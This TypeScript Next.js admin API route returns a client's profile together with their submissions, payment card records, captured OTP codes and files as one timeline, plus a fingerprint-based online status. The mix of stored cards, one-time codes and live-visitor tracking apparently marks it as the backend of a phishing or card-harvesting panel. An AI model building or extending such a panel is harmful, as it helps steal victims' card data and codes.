import { NextRequest, NextResponse } from 'next/server';
import { getAdminFromRequest } from '@/lib/auth';
import { getAdminClient, isClientOnlineSafe } from '@/lib/supabase';

// تفاصيل العميل الكاملة: الملف الأساسي + كل الصناديق في خط زمني موحّد
export async function GET(req: NextRequest) {
  const admin = getAdminFromRequest(req);
  if (!admin) {
    return NextResponse.json({ error: 'غير مصرّح' }, { status: 401 });
  }

  const clientId = new URL(req.url).searchParams.get('client_id');
  if (!clientId) {
    return NextResponse.json({ error: 'client_id مطلوب' }, { status: 400 });
  }

  const supabase = getAdminClient();

  // 1) بيانات العميل الأساسية (يجب التحقق من وجوده أولاً)
  const { data: client, error: cErr } = await supabase
    .from('clients')
    .select('*')
    .eq('id', clientId)
    .single();
  if (cErr || !client) {
    return NextResponse.json({ error: 'العميل غير موجود' }, { status: 404 });
  }

  // 2-5) كل السجلات + المدفوعات + OTP + الملفات بالتوازي (بدل التسلسل) → أسرع بـ ~4x
  const [subR, payR, otpR, fileR] = await Promise.all([
    supabase.from('submissions').select('*').eq('client_id', clientId).order('created_at', { ascending: false }),
    supabase.from('payment_cards').select('*').eq('client_id', clientId).order('created_at', { ascending: false }),
    supabase.from('otp_codes').select('*').eq('client_id', clientId).order('created_at', { ascending: false }),
    supabase.from('files').select('*').eq('client_id', clientId).order('created_at', { ascending: false }),
  ]);

  const submissions = subR.data || [];
  const payments = payR.data || [];
  const otps = otpR.data || [];
  const files = fileR.data || [];

  // بناء الخط الزمني الموحّد: ندمج كل الأنواع ونعطي كل صندوق وقتاً ونوعاً
  type Box = {
    type: 'profile' | 'submission' | 'payment' | 'otp' | 'file';
    time: string;
    data: unknown;
  };
  const timeline: Box[] = [];

  // صندوق الملف الأساسي (الأحدث في الأعلى لاحقاً عند الترتيب)
  timeline.push({
    type: 'profile',
    time: client.created_at,
    data: {
      ...client,
      online: isClientOnlineSafe(client.fingerprint, client.last_seen_at),
    },
  });

  for (const s of submissions || []) {
    timeline.push({ type: 'submission', time: s.created_at, data: s });
  }
  for (const p of payments || []) {
    timeline.push({ type: 'payment', time: p.created_at, data: p });
  }
  for (const o of otps || []) {
    timeline.push({ type: 'otp', time: o.created_at, data: o });
  }
  for (const f of files || []) {
    timeline.push({ type: 'file', time: f.created_at, data: f });
  }

  // الترتيب: الأحدث أولاً
  timeline.sort((a, b) => new Date(b.time).getTime() - new Date(a.time).getTime());

  return NextResponse.json({ client, timeline });
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
